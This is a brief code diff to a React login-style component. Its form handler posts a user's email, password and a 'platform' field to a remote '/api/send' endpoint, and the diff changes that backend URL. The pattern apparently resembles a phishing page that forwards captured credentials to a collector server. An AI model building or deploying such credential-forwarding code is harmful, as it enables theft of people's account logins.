@@ -27,7 +27,7 @@ function Home(){
       e.preventDefault();
 
       try {
-        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
+        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
